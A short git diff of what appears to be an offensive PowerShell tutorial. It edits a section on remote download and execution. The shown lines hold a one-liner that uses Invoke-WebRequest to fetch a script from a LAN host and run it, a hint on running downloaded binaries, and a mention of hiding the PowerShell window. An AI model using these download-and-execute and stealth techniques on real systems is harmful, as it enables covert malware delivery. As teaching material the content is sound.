@@ -644,9 +644,11 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
-      TODO: [ Invoke-WebRequest - Additional Methods for Remote Download ]
+      [ Invoke-WebRequest - Additional Methods for Remote Download ]
       This method 'Invoke-WebRequest' working together with 'PassThru', 'OutFile' and 'File'  powershell
       parameters allow us to remote download (full path can be inputed to URL string) and execute our script.
+
+      HINT: If you wish to download/execute an binary.exe, then replace the -File by Invoke-Item parameter
 
 
 <br />
@@ -656,7 +658,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
       Invoke-WebRequest "http://192.168.1.71/Invoke-Hello.ps1" -OutFile "Invoke-Hello.ps1" -PassThru; powershell.exe -File Invoke-Hello.ps1
 
 ![powershell Additional Methods for Remote Download](http://i.cubeupload.com/1YYzR3.jpg)
-`HINT: In this example was not used the -win hidden switch that allow us to hidde the powershell windows`
+`HINT: In this example was not used the -win hidden switch that allow us to hidde the powershell windows`<br />
 
 ---
 
